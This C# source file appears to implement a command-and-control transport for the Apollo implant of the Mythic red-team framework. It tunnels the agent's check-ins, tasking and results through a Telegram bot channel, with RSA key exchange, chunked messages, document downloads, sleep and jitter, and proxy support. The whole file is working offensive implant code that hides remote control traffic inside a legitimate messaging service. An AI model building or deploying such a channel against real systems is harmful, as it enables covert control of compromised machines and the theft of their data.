using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;

namespace TelegramTransport
{
    public sealed class TelegramProfile : C2Profile, IC2Profile, IDisposable
    {
        private const int EnvelopeChunkSize = 2800;
        private readonly int _callbackInterval;
        private readonly double _callbackJitter;
        private readonly bool _encryptedExchangeCheck;
        private readonly int _messageChecks;
        private readonly int _timeBetweenChecks;
        private readonly string _controllerBot;
        private readonly string _routeId = Guid.NewGuid().ToString("N");
        private readonly TelegramApiClient _telegram;
        private readonly ChunkAssembler _assembler = new ChunkAssembler();
        private readonly Queue<string> _pushedPayloads = new Queue<string>();
        private readonly object _pushedPayloadsLock = new object();
        private readonly RSAKeyGenerator _rsa;
        private bool _keyExchanged;
        private bool _uuidNegotiated;

        public TelegramProfile(
            Dictionary<string, string> data,
            ISerializer serializer,
            IAgent agent) : base(data, serializer, agent)
        {
            _callbackInterval = ParsePositiveInt(data["callback_interval"], 60);
            _callbackJitter = ParseNonNegativeDouble(data["callback_jitter"], 0);
            _messageChecks = ParsePositiveInt(data["message_checks"], 10);
            _timeBetweenChecks = ParsePositiveInt(data["time_between_checks"], 10);
            _encryptedExchangeCheck = IsTrue(data["encrypted_exchange_check"]);
            _controllerBot = NormalizeUsername(data["controller_bot"]);
            _rsa = agent.GetApi().NewRSAKeyPair(4096);
            _telegram = new TelegramApiClient(
                data["bot_token"],
                data["api_base"],
                data["user_agent"],
                data["proxy_host"],
                data["proxy_port"],
                data["proxy_user"],
                data["proxy_pass"]);

            Agent.SetSleep(_callbackInterval, _callbackJitter);
        }

        public bool Connect(CheckinMessage checkinMessage, OnResponse<MessageResponse> onResp)
        {
            if (_encryptedExchangeCheck && !_keyExchanged)
            {
                var handshake = new EKEHandshakeMessage
                {
                    Action = "staging_rsa",
                    PublicKey = _rsa.ExportPublicKey(),
                    SessionID = _rsa.SessionId
                };

                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(
                    handshake,
                    response =>
                    {
                        byte[] key = _rsa.RSA.Decrypt(Convert.FromBase64String(response.SessionKey), true);
                        var cryptographicSerializer = (ICryptographySerializer)Serializer;
                        cryptographicSerializer.UpdateKey(Convert.ToBase64String(key));
                        cryptographicSerializer.UpdateUUID(response.UUID);
                        Agent.SetUUID(response.UUID);
                        _keyExchanged = true;
                        return true;
                    }))
                {
                    return false;
                }
            }

            return SendRecv<CheckinMessage, MessageResponse>(
                checkinMessage,
                response =>
                {
                    Connected = true;
                    if (!_uuidNegotiated)
                    {
                        ((ICryptographySerializer)Serializer).UpdateUUID(response.ID);
                        Agent.SetUUID(response.ID);
                        _uuidNegotiated = true;
                    }
                    return onResp(response);
                });
        }

        public void Start()
        {
            while (Agent.IsAlive())
            {
                bool succeeded = Agent.GetTaskManager().CreateTaskingMessage(
                    message => SendRecv<TaskingMessage, MessageResponse>(
                        message,
                        response => Agent.GetTaskManager().ProcessMessageResponse(response)));
                if (!succeeded)
                {
                    Connected = false;
                    return;
                }

                Agent.Sleep();
            }
        }

        public bool Send<T>(T message)
        {
            throw new NotSupportedException("TelegramProfile requires request-response exchanges.");
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            string payload = Serializer.Serialize(message!);
            string requestId = Guid.NewGuid().ToString("N");

            for (int attempt = 0; attempt < 3; attempt++)
            {
                try
                {
                    SendPayload(payload, requestId);
                    string? response = ReceivePayload(requestId);
                    if (response == null)
                    {
                        continue;
                    }

                    return onResponse(Serializer.Deserialize<TResult>(response));
                }
                catch
                {
                }
            }

            Connected = false;
            return false;
        }

        public bool Recv(MessageType messageType, OnResponse<IMythicMessage> onResponse)
        {
            throw new NotSupportedException("TelegramProfile requires request-response exchanges.");
        }

        public bool IsOneWay()
        {
            return false;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        private void SendPayload(string payload, string packetId)
        {
            int chunks = Math.Max(1, (payload.Length + EnvelopeChunkSize - 1) / EnvelopeChunkSize);
            for (int index = 0; index < chunks; index++)
            {
                int offset = index * EnvelopeChunkSize;
                int length = Math.Min(EnvelopeChunkSize, payload.Length - offset);
                var envelope = new TelegramEnvelope
                {
                    SenderId = _routeId,
                    ToServer = true,
                    PacketId = packetId,
                    SleepSeconds = Math.Max(1, _callbackInterval),
                    JitterPercent = Math.Max(0, Convert.ToInt32(_callbackJitter)),
                    Chunk = index,
                    Chunks = chunks,
                    Message = payload.Substring(offset, length)
                };

                _telegram.SendText(_controllerBot, JsonCodec.Serialize(envelope));
            }
        }

        private string? ReceivePayload(string requestId)
        {
            for (int attempt = 0; attempt < _messageChecks; attempt++)
            {
                ProcessPushedPayloads();
                string? correlatedPayload = null;
                TelegramUpdate[] updates = _telegram.GetUpdates(_timeBetweenChecks);
                foreach (TelegramUpdate update in updates)
                {
                    TelegramMessage? message = update.Message;
                    if (message == null ||
                        message.From == null ||
                        !message.From.IsBot ||
                        !string.Equals(
                            NormalizeUsername(message.From.Username ?? string.Empty),
                            _controllerBot,
                            StringComparison.OrdinalIgnoreCase) ||
                        string.IsNullOrWhiteSpace(message.Text))
                    {
                        continue;
                    }

                    TelegramEnvelope envelope;
                    try
                    {
                        envelope = JsonCodec.Deserialize<TelegramEnvelope>(message.Text!);
                    }
                    catch (SerializationException)
                    {
                        continue;
                    }

                    if (envelope == null ||
                        envelope.ToServer ||
                        !string.Equals(envelope.ClientId, _routeId, StringComparison.Ordinal))
                    {
                        continue;
                    }

                    bool completesRequest = string.Equals(
                        envelope.ReplyToPacketId,
                        requestId,
                        StringComparison.Ordinal);
                    bool isPushedTasking = string.IsNullOrEmpty(envelope.ReplyToPacketId);
                    string assembled;

                    // document delivery: the payload is in a previously sent document
                    if (envelope.Message == "DOC" && completesRequest)
                    {
                        // find the most recent document in the chat
                        TelegramUpdate[] docUpdates = _telegram.GetUpdates(0);
                        foreach (TelegramUpdate docUpdate in docUpdates)
                        {
                            var doc = docUpdate.Message?.Document;
                            if (doc == null || string.IsNullOrWhiteSpace(doc.FileId)) continue;
                            byte[]? docData = _telegram.DownloadDocument(doc.FileId);
                            if (docData != null) { correlatedPayload = System.Text.Encoding.UTF8.GetString(docData); break; }
                        }
                        if (correlatedPayload != null) { return correlatedPayload; }
                        continue;
                    }
                    if ((!completesRequest && !isPushedTasking) ||
                        !_assembler.TryAdd(envelope, out assembled))
                    {
                        continue;
                    }

                    if (completesRequest)
                    {
                        if (correlatedPayload == null)
                        {
                            correlatedPayload = assembled;
                        }
                    }
                    else
                    {
                        lock (_pushedPayloadsLock)
                        {
                            _pushedPayloads.Enqueue(assembled);
                        }
                    }
                }

                ProcessPushedPayloads();
                if (correlatedPayload != null)
                {
                    return correlatedPayload;
                }
            }

            return null;
        }

        private void ProcessPushedPayloads()
        {
            if (!Connected)
            {
                return;
            }

            while (true)
            {
                string payload;
                lock (_pushedPayloadsLock)
                {
                    if (_pushedPayloads.Count == 0)
                    {
                        return;
                    }
                    payload = _pushedPayloads.Dequeue();
                }

                try
                {
                    Agent.GetTaskManager().ProcessMessageResponse(
                        Serializer.Deserialize<MessageResponse>(payload));
                }
                catch
                {
                }
            }
        }

        private static bool IsTrue(string value)
        {
            return string.Equals(value, "T", StringComparison.OrdinalIgnoreCase) ||
                   string.Equals(value, "true", StringComparison.OrdinalIgnoreCase);
        }

        private static int ParsePositiveInt(string value, int fallback)
        {
            int parsed;
            return int.TryParse(value, out parsed) && parsed > 0 ? parsed : fallback;
        }

        private static double ParseNonNegativeDouble(string value, double fallback)
        {
            double parsed;
            return double.TryParse(value, out parsed) && parsed >= 0 ? parsed : fallback;
        }

        private static string NormalizeUsername(string username)
        {
            string normalized = username.Trim();
            return normalized.StartsWith("@", StringComparison.Ordinal)
                ? normalized
                : "@" + normalized;
        }

        public void Dispose()
        {
            _telegram.Dispose();
        }
    }
}
